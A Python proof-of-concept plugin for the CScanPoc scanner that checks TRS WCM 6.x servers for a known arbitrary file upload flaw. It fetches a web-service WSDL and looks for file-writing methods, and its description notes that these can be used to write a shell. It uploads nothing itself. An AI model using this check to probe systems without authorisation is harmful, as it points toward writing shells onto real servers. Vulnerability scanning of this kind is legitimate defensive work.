# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TRS-WCM_0002'  # 平台漏洞编号，留空
    name = '拓尔思内容协作平台 /wcm/services/ 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2013-08-14'  # 漏洞公布时间
    desc = '''
        TRS Web Content Management( TRS WCM ), 是-套完全基于Java和浏览器技术的网络内容管理软件。
        拓尔思拓尔思内容协作平台 ６.ｘ的 Web Service 提供了向服务器写入文件的方式，可以写入shell.
        web service的路径为：http://xxx.xxx/wcm/services/.
    '''  # 漏洞描述
    ref = 'http://boombao.net/2017/10/26/trswcm%E6%BC%8F%E6%B4%9E%E5%B0%8F%E8%AE%B0/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TRS-WCM(拓尔思内容协作平台)'  # 漏洞应用名称
    product_version = '6.X'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3acaf8b3-33af-4a04-aedd-db2915089a0c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/wcm/services/trs:templateservicefacade?wsdl'
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if req.status_code == 200 and 'writeFile' in req.text and 'writeSpecFile' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
